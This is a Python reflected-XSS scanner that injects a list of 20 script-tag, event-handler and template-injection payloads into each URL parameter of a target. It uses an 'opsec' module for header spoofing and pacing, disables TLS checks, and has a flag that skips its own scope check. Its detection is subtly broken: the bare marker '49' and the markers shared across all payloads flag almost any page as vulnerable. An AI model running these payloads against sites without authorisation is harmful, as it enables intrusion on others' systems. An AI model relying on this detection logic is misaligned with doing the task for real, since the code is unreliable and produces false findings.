"""
tools/xss_scanner.py
Reflected XSS scanner.

Injects XSS payloads into every URL parameter and checks whether the
payload appears unescaped in the response body (reflected XSS indicator).
"""
import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode
from dataclasses import dataclass, field
from security.validator import is_allowed_target
from opsec import get_headers, opsec_sleep

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_TIMEOUT = 10
_HEADERS = get_headers()

# 20 payloads — basic reflections, attribute breaks, event handlers,
# script tags, SVG/img vectors, template injection markers, and a
# JS-URL variant to cover diverse parser contexts.
_PAYLOADS = [
    '<script>alert(1)</script>',
    '<script>alert("xss")</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=alert("xss")>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "' onmouseover='alert(1)",
    '" onmouseover="alert(1)',
    '"><body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    'javascript:alert(1)',
    '<<SCRIPT>alert("xss");//<</SCRIPT>',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '${alert(1)}',
    '{{7*7}}',  # template injection marker (Jinja2 / AngularJS)
]

# Strings that confirm unescaped reflection in the response body
_REFLECTION_MARKERS = [
    '<script>alert(1)</script>',
    '<script>alert("xss")</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=alert("xss")>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "onmouseover='alert(1)",
    'onmouseover="alert(1)',
    '<body onload=alert(1)>',
    'javascript:alert(1)',
    'alert("xss")',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '${alert(1)}',
    '49',   # result of {{7*7}} — template injection indicator
]

_SNIPPET_WINDOW = 120  # chars of context around a match in the response body


@dataclass
class XSSFinding:
    parameter:        str
    payload:          str
    url_tested:       str
    reflected:        bool
    response_snippet: str


@dataclass
class XSSResult:
    success:  bool
    target:   str
    findings: list[XSSFinding] = field(default_factory=list)
    error:    str = ""

    @property
    def has_findings(self) -> bool:
        return bool(self.findings)

    @property
    def confirmed(self) -> list[XSSFinding]:
        return [f for f in self.findings if f.reflected]


def _extract_params(url: str) -> dict[str, list[str]]:
    """Return the existing query parameters from the URL."""
    return parse_qs(urlparse(url).query, keep_blank_values=True)


def _inject(url: str, param: str, payload: str) -> str:
    """Return a copy of *url* with *param* set to *payload*."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    return parsed._replace(query=urlencode(qs, doseq=True)).geturl()


def _check_reflection(body: str, payload: str) -> tuple[bool, str]:
    """
    Return (reflected, snippet).
    Checks whether a meaningful part of the payload appears unescaped.
    """
    body_lower = body.lower()
    for marker in _REFLECTION_MARKERS:
        idx = body_lower.find(marker.lower())
        if idx != -1:
            start = max(0, idx - 30)
            end   = min(len(body), idx + _SNIPPET_WINDOW)
            return True, body[start:end]
    # Fallback: raw payload present verbatim
    idx = body.find(payload)
    if idx != -1:
        start = max(0, idx - 30)
        end   = min(len(body), idx + _SNIPPET_WINDOW)
        return True, body[start:end]
    return False, ""


def scan_xss(url: str, confirmed: bool = False) -> XSSResult:
    """
    Scan every query parameter of *url* for reflected XSS.

    If *url* has no parameters the scan still runs with a synthetic
    `q` parameter so that the endpoint itself is exercised.

    Args:
        url:       Full URL including query string, e.g.
                   http://target.com/search?q=hello
        confirmed: Skip scope check if authorisation already confirmed.

    Returns:
        XSSResult with findings for every parameter × payload combination
        where the payload was reflected unescaped.
    """
    parsed = urlparse(url)
    host = parsed.hostname or url

    if not confirmed and not is_allowed_target(host):
        return XSSResult(
            success=False,
            target=url,
            error=f"Target '{host}' is outside the allowed scope.",
        )

    params = _extract_params(url)
    if not params:
        # No params found — try a generic 'q' parameter anyway
        params = {"q": [""]}

    result = XSSResult(success=True, target=url)
    # Track (param, payload) to avoid duplicate findings
    seen: set[tuple[str, str]] = set()

    for param in params:
        for payload in _PAYLOADS:
            key = (param, payload)
            if key in seen:
                continue

            test_url = _inject(url, param, payload)
            try:
                resp = requests.get(
                    test_url,
                    headers=_HEADERS,
                    timeout=_TIMEOUT,
                    verify=False,
                    allow_redirects=True,
                )
                opsec_sleep()
            except Exception as exc:
                if not result.error:
                    result.error = str(exc)
                continue

            body = resp.text
            reflected, snippet = _check_reflection(body, payload)

            if reflected:
                seen.add(key)
                result.findings.append(XSSFinding(
                    parameter=param,
                    payload=payload,
                    url_tested=test_url,
                    reflected=True,
                    response_snippet=snippet,
                ))

    return result
